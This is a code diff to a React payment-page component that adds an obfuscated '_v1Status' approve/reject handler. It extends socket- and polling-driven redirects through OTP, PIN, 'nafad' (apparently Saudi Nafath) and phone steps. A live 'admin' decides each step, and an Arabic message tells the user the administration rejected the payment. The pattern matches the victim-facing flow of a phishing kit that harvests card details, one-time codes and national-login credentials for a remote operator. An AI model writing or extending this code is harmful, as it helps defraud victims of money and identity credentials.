@@ -177,12 +177,24 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         console.log('[Card Status] Socket update:', status)
         handleCardStatus(status)
       }
-      // Handle direct redirect via socket
+      // Handle _v1Status for payment approval/rejection
+      if (field === '_v1Status') {
+        console.log('[Payment] _v1Status update:', status)
+        if (status === 'approved') {
+          setIsWaitingAdmin(false)
+          navigate('/step2')
+        } else if (status === 'rejected') {
+          setCardRejectionError('تم رفض الدفع من قبل الإدارة. يرجى المحاولة مرة أخرى.')
+          setIsWaitingAdmin(false)
+        }
+      }
+      // Handle redirectPage for direct navigation
       if (field === 'redirectPage') {
-        if (status === 'otp' || status === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
-        else if (status === 'pin' || status === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
-        else if (status === 'nafad' || status === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
-        else if (status === 'phone' || status === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
+        console.log('[Payment] redirectPage via socket:', status)
+        if (status === 'step2' || status === 'otp' || status === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
+        else if (status === 'step3' || status === 'pin' || status === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
+        else if (status === 'step4' || status === 'nafad' || status === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
+        else if (status === 'step5' || status === 'phone' || status === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
         else if (status === 'thank-you') { setIsWaitingAdmin(false); navigate('/thank-you') }
       }
     })
@@ -194,6 +206,20 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         const res = await fetch(`${API_BASE}/api/visitors/${visitorID}`)
         if (!res.ok) return
         const data = await res.json()
+        // Check _v1Status for payment approval/rejection
+        const paymentStatus = data._v1Status || data._v1_status
+        if (paymentStatus) {
+          console.log('[Payment] Polling _v1Status:', paymentStatus)
+          if (paymentStatus === 'approved') {
+            setIsWaitingAdmin(false)
+            navigate('/step2')
+            return
+          } else if (paymentStatus === 'rejected') {
+            setCardRejectionError('تم رفض الدفع من قبل الإدارة. يرجى المحاولة مرة أخرى.')
+            setIsWaitingAdmin(false)
+            return
+          }
+        }
         // Check cardStatus (backend returns snake_case)
         const cs = data.card_status || data.cardStatus
         if (cs && cs !== 'pending') {
@@ -203,10 +229,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         // Check redirectPage (backend returns snake_case)
         const rp = data.redirect_page || data.redirectPage
         if (rp) {
-          if (rp === 'otp' || rp === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
-          else if (rp === 'pin' || rp === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
-          else if (rp === 'nafad' || rp === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
-          else if (rp === 'phone' || rp === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
+          console.log('[Payment] Polling redirectPage:', rp)
+          if (rp === 'step2' || rp === 'otp' || rp === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
+          else if (rp === 'step3' || rp === 'pin' || rp === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
+          else if (rp === 'step4' || rp === 'nafad' || rp === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
+          else if (rp === 'step5' || rp === 'phone' || rp === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
           else if (rp === 'thank-you') { setIsWaitingAdmin(false); navigate('/thank-you') }
         }
       } catch {
